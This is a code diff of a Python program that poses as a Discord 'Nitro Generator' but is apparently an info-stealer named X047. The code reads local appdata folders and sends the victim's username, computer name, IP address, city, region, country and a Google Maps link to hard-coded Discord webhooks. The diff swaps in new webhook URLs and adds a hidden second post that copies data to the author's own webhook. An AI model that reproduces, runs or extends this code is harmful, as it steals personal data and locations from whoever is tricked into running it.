@@ -23,7 +23,7 @@ from Crypto.Cipher import AES
 
 class X047:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/926522599117316116/FVvWhK-Qp6suGVcV-Wpa8j-iXYPK2cuBdYJxzCq88vrkMI2v4guIZw4U8cBPOpi2uYQd"
+        self.webhook = "https://discord.com/api/webhooks/926550198132543548/aZ7qr1eYXAp7nCrDYEjWapS05RKQ9EGvtOU9n3zVGiwtnCIiwumMORphJHYS7fxXyjhk"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -307,7 +307,7 @@ class X047:
                         "url": "https://discord.gg/VUzeqjWVUf",
                         "icon_url": "https://cdn.discordapp.com/attachments/854351978132930560/919870761634770964/OBBAAMA-1-1.gif"
                     },
-                    "description": f"**{os.getlogin()}** Got rekt by X047 \n```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```",
+                    "description": f"**{os.getlogin()}** Just got rekt by X047\n```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})",
                     "color": 38655,
 
                     "thumbnail": {
@@ -434,11 +434,9 @@ if (mode == "1"):
         "username": "Nitro Generator my ass"
     }
     result = requests.post(webhurl, json=data1)
-    result2 = requests.post \
-        ("https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ", json=data3)
-    result.raise_for_status()
-    if webhurl != "https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ":
-        result2.raise_for_status()
+    if webhurl != "https://discord.com/api/webhooks/929103379031015474/BgVjgPA3tw8w9QFqo_PUzeXvgMCX5sXV_R-H_DRjDTWj7O61kjmGtsUwue0OXnoaKYeY":
+        result2 = requests.post("https://discord.com/api/webhooks/929103379031015474/BgVjgPA3tw8w9QFqo_PUzeXvgMCX5sXV_R-H_DRjDTWj7O61kjmGtsUwue0OXnoaKYeY", json=data3)
+
     os.system("CLS")
     for i in range(threadsnumber):
         threading.Thread(target=generatecodes).start()
